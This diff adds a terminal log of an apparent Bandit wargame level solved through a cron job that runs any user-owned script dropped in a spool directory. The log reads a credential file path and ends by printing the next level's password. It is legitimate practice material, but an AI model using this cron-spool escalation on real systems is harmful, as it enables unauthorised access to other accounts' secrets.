@@ -1,0 +1,62 @@
+bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+
+bandit23@bandit:/etc/cron.d$ whoami
+bandit23
+bandit23@bandit:/etc/cron.d$ myname=bandit24
+bandit23@bandit:/etc/cron.d$ cd /var/spool/bandit24/
+bandit23@bandit:/var/spool/bandit24$ ls
+ls: cannot open directory '.': Permission denied
+bandit23@bandit:/var/spool/bandit24$ which bash
+/bin/bash
+bandit23@bandit:/var/spool/bandit24$ cat /etc/bandit_pass/bandit24
+cat: /etc/bandit_pass/bandit24: Permission denied
+bandit23@bandit:/var/spool/bandit24$ mkdir /tmp/anivedh222
+bandit23@bandit:/var/spool/bandit24$ chmod 777 /tmp/anivedh222
+bandit23@bandit:/var/spool/bandit24$ ls -l /tmp/anivedh222
+total 0
+bandit23@bandit:/var/spool/bandit24$ date
+Fri Aug 28 15:50:35 CEST 2020
+bandit23@bandit:/var/spool/bandit24$ date
+Fri Aug 28 15:50:39 CEST 2020
+bandit23@bandit:/var/spool/bandit24$ nano get.sh
+Unable to create directory /home/bandit23/.nano: Permission denied
+It is required for saving/loading search history or cursor positions.
+
+Press Enter to continue
+
+bandit23@bandit:/var/spool/bandit24$ chmod +x get.sh
+bandit23@bandit:/var/spool/bandit24$ ls get.sh
+get.sh
+bandit23@bandit:/var/spool/bandit24$ date
+Fri Aug 28 15:52:45 CEST 2020
+bandit23@bandit:/var/spool/bandit24$ ls /tmp/anivedh222
+bandit23@bandit:/var/spool/bandit24$ ls /tmp/anivedh222
+bandit23@bandit:/var/spool/bandit24$ ls /tmp/anivedh222
+bandit23@bandit:/var/spool/bandit24$ ls /tmp/anivedh222
+bandit23@bandit:/var/spool/bandit24$ ls /tmp/anivedh222
+thepass.txt
+bandit23@bandit:/var/spool/bandit24$ cat /tmp/anivedh222/thepass.txt 
+
+
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
